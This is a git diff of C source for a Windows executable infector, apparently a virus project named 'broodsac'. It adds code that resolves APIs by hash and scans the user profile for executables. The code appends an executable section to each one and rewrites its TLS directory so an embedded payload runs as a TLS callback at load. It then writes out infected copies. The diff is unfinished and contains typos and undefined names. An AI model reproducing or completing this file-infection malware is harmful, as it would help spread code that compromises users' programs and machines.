@@ -65,6 +65,7 @@ typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
 typedef HANDLE (* CreateFileAHeader)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef DWORD (* GetFileSizeHeader)(HANDLE, LPDWORD);
 typedef BOOL (* ReadFileHeader)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL (* WriteFileHeader)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL (* CloseHandleHeader)(HANDLE);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
 typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
@@ -88,6 +89,7 @@ typedef struct __InfectorIAT
    CreateFileAHeader createFile;
    GetFileSizeHeader getFileSize;
    ReadFileHeader readFile;
+   WriteFileHeader writeFile;
    CloseHandleHeader closeHandle;
 
    /* shell32 */
@@ -250,10 +252,10 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
    return NULL;
 }
 
-PIMAGE_DOS_HEADER infect_32bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, size_t size)
+CVector infect_32bit(InfectorIAT *iat, CVector *module)
 {
-   uint8_t *byte_module = RECAST(uint8_t *,module);
-   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+module->e_lfanew);
+   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
+   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module, PIMAGE_DOS_HEADER)->e_lfanew);
 
    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
    {
@@ -272,21 +274,181 @@ PIMAGE_DOS_HEADER infect_32bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, size_
    size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+module->e_lfanew+nt_headers_size);
 
-   return NULL;
+   return cvector_alloc(iat, sizeof(uint8_t), 0);
 }
 
-PIMAGE_DOS_HEADER infect_64bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, size_t size)
+CVector infect_64bit(InfectorIAT *iat, CVector *module)
 {
-   uint8_t *byte_module = RECAST(uint8_t *,module);
-   PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+module->e_lfanew);
+   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
+   PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
    size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
-   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+module->e_lfanew+nt_headers_size);
-   CVector relocations = cvector_alloc(iat, 0, 0);
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+   IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
+   IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
+   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
+   DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;
+
+   if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
+      new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
+
+   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
+      return result;
+
+   size_t new_section_size = 0;
+   
+   nt_headers->FileHeader.NumberOfSections += 1;
+   new_section->PointerToRawData = new_section_offset;
+   new_section->VirtualAddress = last_section->VirtualAddress + last_section->SizeOfRawData;
+
+   if (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment != 0)
+      new_section->VirtualAddress += nt_headers->OptionalHeader.SectionAlignment - (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment);
+
+   new_section_size += sizeof(IMAGE_TLS_DIRECTORY64);
+   PIMAGE_TLS_DIRECTORY64 old_tls_directory;
+   IMAGE_TLS_DIRECTORY64 new_tls_directory;
+
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0)
+   {
+      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY64,byte_module+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+      iat->memcpy(&new_tls_directory, old_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
+   }
+
+   CVector tls_data = cvector_alloc(iat, sizeof(uint8_t), 1);
+   CVector tls_callbacks = cvector_alloc(iat, sizeof(uintptr_t), 0);
+
+   if (old_tls_directory != NULL && old_tls_directory->StartAddressOfRawData != 0)
+   {
+      cvector_realloc(iat, &tls_data, old_tls_directory->EndAddressOfRawData - old_tls_directory->StartAddressOfRawData);
+      DWORD data_rva = old_tls_directory->StartAddressOfRawData - nt_headers->OptionalHeader.ImageBase;
+      iat->memcpy(tls_data.data, byte_module+data_rva, tls_data.elements);
+   }
+
+   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallbacks != 0)
+   {
+      DWORD callback_rva = old_tls_directory->AddressOfCallbacks - nt_headers->OptionalHeader.ImageBase;
+      uintptr_t *callback_array = RECAST(uintptr_t *,byte_module+callback_rva);
+
+      do
+      {
+         cvector_push(&iat, &tls_callbacks, callback_array++);
+
+         if (*callback_array == 0)
+            cvector_push(&iat, &tls_callbacks, callback_array);
+      } while (*callback_array != NULL);
+   }
+
+   size_t aligned_tls_data_size = tls_data.elements;
+   
+   if (aligned_tls_data_size % 4 != 0)
+      aligned_tls_data_size += (4 - aligned_tls_data_size % 4);
+   
+   DWORD tls_data_offset = new_section_size;
+   DWORD tls_data_start_rva = new_section->VirtualAddress + tls_data_offset;
+   DWORD tls_data_end_rva = tls_data_start_rva + tls_data.elements;
+   new_section_size += aligned_tls_data_size;
+   new_tls_directory.StartAddressOfRawData = tls_data_start_rva + nt_headers->OptionalHeader.ImageBase;
+   new_tls_directory.EndAddressOfRawData = tls_data_end_rva + nt_headers->OptionalHeader.ImageBase;
+
+   DWORD tls_index_offset = new_section_size;
+   DWORD tls_index_rva = new_section->VirtualAddress + tls_index_offset;
+   new_section_size += sizeof(DWORD);
+   new_tls_directory.AddressOfIndex = tls_index_rva + nt_headers->OptionalHeader.ImageBase;
+
+   DWORD tls_callback_offset = new_section_size;
+   DWORD tls_callback_rva = new_section->VirtualAddress + tls_callback_offset;
+   uintptr_t placeholder = 0xC01DC0FFEE;
+   cvector_insert(iat, &tls_callbacks, 0, &placeholder);
+
+   if (CVECTOR_CAST(&tls_callbacks, uintptr_t *)[tls_callbacks.elements-1] != 0)
+   {
+      uintptr_t zero = 0;
+      cvector_push(iat, &tls_callbacks, &zero);
+   }
+   
+   new_section_size += CVECTOR_BYTES(&tls_callbacks) + 16; // add 16 bytes padding because it would be weird to have assembly directly after
+   new_tls_directory.AddressOfCallbacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;
+   
+   DWORD tls_infection_offset = new_section_size;
+   DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
+   CVECTOR_CAST(&tls_callbacks, uintptr_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
+   new_section_size += INFECTION64_SIZE;
+
+   new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
+   new_section->SizeOfRawData = RECAST(DWORD, new_section_size);
+
+   if (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment != 0)
+      new_section->SizeOfRawData += (nt_headers->OptionalHeader.FileAlignment - (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment));
+
+   new_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
+   iat->memcpy(new_section->Name, "br00dsac", 8);
+   
+   nt_headers->OptionalHeader.DataDirectories[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
+   nt_headers->OptionalHeader.SizeOfImage = 0;
+
+   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
+   {
+      nt_headers->OptionalHeader.SizeOfImage += section_header[i].Misc.VirtualSize;
+
+      if (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment != 0)
+         nt_headers->OtionalHeader.SizeOfImage +=
+            nt_headers->OptionalHeader.SectionAlignment - (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment);
+   }
+
+   CVector new_section_data = cvector_alloc(iat, sizeof(uint8_t), new_section->SizeOfRawData);
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION64, INFECTION64_SIZE);
+
+   cvector_free(iat, &tls_data);
+   cvector_free(iat, &tls_callbacks);
 
    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
-      relocations = cvector_alloc(iat, sizeof(uint32_t), 0);
-         
-   return NULL;
+   {
+      CVector relocations = cvector_alloc(iat, sizeof(DWORD), 0);
+      DWORD target_rva = new_section->VirtualAddress;
+
+      for (size_t i=0; i<4; ++i)
+      {
+         cvector_push(iat, &relocations, &target_rva);
+         target_rva += 8;
+      }
+
+      DWORD callback_rva = new_tls_directory.AddressOfCallbacks - nt_headers->OptionalHeader.ImageBase;
+      uintptr_t *callback_ptr = RECAST(uintptr_t *, new_section_data+tls_callback_offset);
+
+      while (*callback_ptr != 0)
+      {
+         cvector_push(iat, &relocations, &callback_rva);
+         callback_rva += sizeof(uintptr_t);
+         callback_ptr++;
+      }
+
+      PIMAGE_BASE_RELOCATION base_relocation = RECAST(PIMAGE_BASE_RELOCATION,byte_module+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+      while (base_relocation->VirtualAddress != 0)
+         base_relocation = RECAST(PIMAGE_BASE_RELOCATION,RECAST(uint8_t *, base_relocation)+sizeof(DWORD)+sizeof(DWORD)+sizeof(WORD)*base_relocation->SizeOfBlock);
+
+      base_relocation->VirtualAddress = CVECTOR_CAST(&relocations,DWORD *)[0] & 0xFFFFF000;
+      base_relocation->SizeOfBlock = relocations.elements * sizeof(WORD);
+
+      WORD *relocation_array = RECAST(WORD *,RECAST(uint8_t *,base_relocation)+sizeof(DWORD)*2);
+
+      for (size_t i=0; i<relocations.elements; ++i)
+      {
+         relocation_array[i] = (10 << 12) | (CVECTOR_CAST(&relocations, DWORD *)[i] & 0xFFF);
+      }
+
+      cvector_free(iat, &relocations);
+   }
+
+   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
+   iat->memcpy(result.data, module->data, module->elements);
+   iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);
+
+   cvector_free(iat, &new_section_data);
+            
+   return result;
 }
 
 void load_infector_iat(InfectorIAT *iat)
@@ -320,6 +482,7 @@ void load_infector_iat(InfectorIAT *iat)
    iat->memcpy = RECAST(memcpyHeader,get_proc_by_hash(msvcrtModule, 0xa45cec64));
    PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
    iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
+   printf("WriteFile: 0x%08x", fnv321a("WriteFile"));
 }
 
 int infect(void)
@@ -327,13 +490,16 @@ int infect(void)
    InfectorIAT iat;
    load_infector_iat(&iat);
 
+   return 0;
+
 #ifdef BROODSACDEBUG
+   // TODO make this a compiler-controlled variable that points at our built executables
    char profile_directory[MAX_PATH+1] = "C:\\Users\\teal\\Documents\\broodsac";
 #else
    char profile_directory[MAX_PATH+1];
 
    if (iat.getFolderPath(NULL, CSIDL_PROFILE, NULL, 0, profile_directory) != 0)
-      return 2;
+      return 1;
 #endif
 
    char prepend_path[] = "\\\\?\\";
@@ -426,39 +592,72 @@ int infect(void)
          goto close_file;
       }
 
-      uint8_t *exe_buffer = RECAST(uint8_t *,iat.malloc(file_size));
+      CVector exe_buffer = cvector_alloc(&iat, sizeof(uint8_t), file_size);
       DWORD bytes_read = 0;
 
-      if (!iat.readFile(exe_handle, exe_buffer, file_size, &bytes_read, NULL))
+      if (!iat.readFile(exe_handle, CVECTOR_CAST(&exe_buffer, uint8_t *), exe_buffer.elements, &bytes_read, NULL))
       {
          printf("\tFailed to read %s\n", executable);
          goto free_file;
       }
 
-      IMAGE_DOS_HEADER *dos_header = RECAST(PIMAGE_DOS_HEADER,exe_buffer);
-      IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,exe_buffer+dos_header->e_lfanew);
-      IMAGE_DOS_HEADER *rewritten_image;
+      IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(&exe_buffer,PIMAGE_DOS_HEADER);
+      IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(&exe_buffer,uint8_t *)+dos_header->e_lfanew);
+      CVector rewritten_image;
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
          printf("\t%s is 32-bit.\n", executable);
-         rewritten_image = infect_32bit(&iat, dos_header, file_size);
+         rewritten_image = infect_32bit(&iat, &exe_buffer);
       }
       else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
       {
          printf("\t%s is 64-bit.\n", executable);
-         rewritten_image = infect_64bit(&iat, dos_header, file_size);
+         rewritten_image = infect_64bit(&iat, &exe_buffer);
       }
 
-      if (rewritten_image != NULL)
+      if (rewritten_image.data != NULL)
       {
+         char stub[] = "_infected.exe";
+         CVector new_filename = cvector_alloc(&iat, sizeof(char), iat.strlen(executable)+iat.strlen(stub)+1);
+         iat.memcpy(new_filename.data, executable, iat.strlen(executable)+1);
+         iat.strncat(new_filename.data, stub, iat.strlen(stub));
+
+         HANDLE infected_handle = iat.createFile(CVECTOR_CAST(&new_filename, char *),
+                                                 GENERIC_WRITE,
+                                                 0,
+                                                 NULL,
+                                                 CREATE_ALWAYS,
+                                                 FILE_ATTRIBUTE_NORMAL,
+                                                 NULL);
+
+         if (infected_handle == INVALID_HANDLE_VALUE)
+         {
+            printf("\tFailed to open %s for writing.\n", CVECTOR_CAST(&new_filename, char *));
+            goto infected_file_cleanup;
+         }
+
+         DWORD bytes_written = 0;
+
+         if (!iat.WriteFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
+         {
+            printf("\tFailed to write %s.\n", CVECTOR_CAST(&new_filename, char *));
+            goto infeced_file_close;
+         }
+
+         printf("\t%s infected.\n", executable);
+         
+      infected_file_close:
+         iat.closeHandle(infected_handle);
+
+      infected_file_cleanup:
          iat.closeHandle(exe_handle);
          exe_handle = INVALID_HANDLE_VALUE;
+         cvector_free(&iat, &rewritten_image);
       }
 
    free_file:
-      iat.free(exe_buffer);
-      exe_buffer = NULL;
+      cvector_free(iat, &exe_buffer);
 
    close_file:
       if (exe_handle != INVALID_HANDLE_VALUE)
